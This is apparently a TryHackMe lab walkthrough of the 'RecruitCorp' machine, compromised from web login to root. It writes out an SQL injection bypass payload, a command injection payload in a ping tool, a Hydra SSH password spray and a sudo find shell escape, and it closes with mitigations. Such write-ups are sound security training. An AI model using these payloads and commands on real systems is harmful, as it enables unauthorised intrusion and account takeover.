# RecruitCorp - TryHackMe Walkthrough

## Machine Information

| Category | Value |
|-----------|---------|
| Platform | TryHackMe |
| Difficulty | Easy |
| OS | Linux |
| Attack Vector | SQL Injection → Command Injection → Credential Attack → Privilege Escalation |

---
# Summary

This machine demonstrates a realistic attack chain involving multiple vulnerabilities.
The compromise path was:
1. Discover hidden administrative portal
2. Exploit SQL Injection in the login form
3. Enumerate internal functionality
4. Discover command injection in a maintenance tool
5. Gain remote code execution
6. Obtain database credentials
7. Identify valid system users
8. Password spray/brute-force SSH
9. Gain shell access as a local user
10. Abuse sudo permissions for privilege escalation
11. Obtain root access

---
# Enumeration
## Nmap Scan
```bash
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

nmap -sCV -Pn recruitcorp.thm
```
### Results
```text
22/tcp  open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp  open  http    Apache 2.4.58
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```
### Initial Observations
- SSH exposed
- Apache web server exposed
- Samba exposed
- Possible web application attack surface

---
# Web Enumeration

## Robots.txt
Browsing the website revealed a robots file.
```text
User-agent: *
Disallow: /admin/
```
Interesting finding:
```text
/admin/
```
The path was intentionally hidden from search engines.

---
## Admin Portal
Navigating to:
```text
http://recruitcorp.thm/admin/
```
revealed an administrative login page.
### Technology Stack

```text
Apache 2.4.58
Ubuntu
PHP Application
```

---
# SQL Injection

## Testing Authentication
Intercepting the login request with Burp Suite:
```http
POST /admin/
```
Modified credentials:
```text
username=admin'--&password=[password omitted]
```
### Why It Works
The payload comments out the remainder of the SQL query.
Example:

```sql
SELECT * FROM users
WHERE username='admin'--'
AND password='password';
```
Everything after `--` becomes ignored.

---
## Successful Login
Server Response:
```http
HTTP/1.1 302 Found
Location: /admin/dashboard.php
```
Authentication bypass succeeded.

---
# Dashboard Enumeration

After login, the dashboard exposed several functions.
Interesting feature:
```text
User Lookup
```
Endpoint:
```text
/admin/users/lookup.php?id=
```

---
# User Enumeration
Testing sequential IDs revealed multiple users.
One record stood out:

```text
Username : sysmaint
Role     : system
Notes     : Service account for
            /admin/sysmaint-checks/ping.php
```
This disclosed another internal endpoint.

---
# Command Injection Discovery
## Maintenance Tool
- Endpoint:
```text
/admin/sysmaint-checks/ping.php
```
Functionality:
```text
Ping arbitrary hosts
```
Input supplied to a system command without proper sanitization.

---
## Proof of Command Execution
- Payload:
```text
127.0.0.1$(id)
```
URL Encoded:
```text
127.0.0.1%24(id)
```
The application executed both:
```bash
ping 127.0.0.1
id
```
This confirmed command injection.

---
# Remote Code Execution

Once command execution was confirmed, a reverse shell was launched.
- After catching the connection:
```bash
whoami
```
Output:
```text
www-data
```
We now had code execution as the web server user.

---
# Local Enumeration

## Web Root
```bash
cd /var/www/html
```
Interesting directories:
```text
admin/
config/
```

---
## Database Configuration
Inside:
```bash
/var/www/html/config
```
Found:
```text
db.conf
```
Contents:
```text
db_host=localhost
db_name=recruitcorp
db_user=jford
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
db_engine=sqlite3
```

---
# Hash Analysis
The password hash was identified as:
```text
bcrypt
```
Although bcrypt was present, cracking attempts were unsuccessful.
Instead of spending excessive time on password recovery, enumeration continued.

---
# User Discovery

- Examining local users:
```bash
cat /etc/passwd
```
Interesting accounts:
```text
ubuntu
jford
```
Both possessed interactive shells.
```text
/bin/bash
```
This made them strong candidates for SSH access.

---
# Password Attack

A seasonal password pattern was tested.
- Base word:
```text
spring2026
```
- Rule-based mutations were generated using `Hashcat`.
```bash
hashcat --stdout base.txt \
-r /usr/share/hashcat/rules/dive.rule \
> wordlist.txt
```
- Hydra was then used against SSH.
```bash
hydra -l jford \
-P wordlist.txt \
ssh://recruitcorp.thm \
-t 32 -f
```
- Success:
```text
login: jford
password: [password omitted]
```
---
# Initial Access

## SSH Login
```bash
ssh jford@recruitcorp.thm
```
Authenticated successfully.

---
# User Flag

```bash
cat user.txt
```

```text
[flag omitted]
```

---
# Privilege Escalation
## Sudo Enumeration
```bash
sudo -l
```
- Output:
```text
(root) NOPASSWD: /usr/bin/find
```
This is a well-known privilege escalation vector.

---
## GTFOBins

Reference:
```text
find -exec /bin/sh \; -quit
```
Execution:
```bash
sudo find . -exec /bin/sh \; -quit
```
Shell obtained:
```text
#
```
Verification:
```bash
whoami
```
Output:
```text
root
```

---
# Root Flag

Navigate to root directory:
```bash
cd /root
```
Read the flag:
```bash
cat flag.txt
```
Output:

```text
[flag omitted]
```

---
# Attack Chain

```text
robots.txt
      │
      ▼
Admin Portal
      │
      ▼
SQL Injection
      │
      ▼
Dashboard Access
      │
      ▼
User Enumeration
      │
      ▼
Ping Endpoint Discovery
      │
      ▼
Command Injection
      │
      ▼
Reverse Shell (www-data)
      │
      ▼
Config File Disclosure
      │
      ▼
User Enumeration
      │
      ▼
SSH Password Attack
      │
      ▼
jford Access
      │
      ▼
sudo find
      │
      ▼
Root
```

---
# Vulnerabilities Identified

## SQL Injection
Impact:
- Authentication bypass
- Administrative access
Mitigation:
- Prepared statements
- Parameterized queries

---
## Information Disclosure
Impact:
- Internal endpoint discovery
- Increased attack surface visibility
Mitigation:
- Remove sensitive notes
- Apply role-based access control
---
## Command Injection
Impact:
- Remote code execution
Mitigation:
- Avoid shell execution
- Strict input validation

---

## Weak Credentials
Impact:
- Successful SSH compromise
Mitigation:
- Strong password policy
- MFA
- Account lockout controls

---
## Dangerous Sudo Permissions
Impact:
- Full root compromise
Mitigation:
- Principle of least privilege
- Restrict dangerous binaries

---
# Flags

## User

```text
[flag omitted]
```
## Root

```text
[flag omitted]
```

---
# Lessons Learned

This machine highlights how several medium-severity findings can chain together into complete system compromise:

- SQL Injection provided initial access
- Information disclosure revealed hidden functionality
- Command Injection enabled code execution
- Weak credentials enabled lateral movement
- Misconfigured sudo permissions resulted in root access

The attack demonstrates why defense-in-depth is critical, as a single control failure rarely exists in isolation.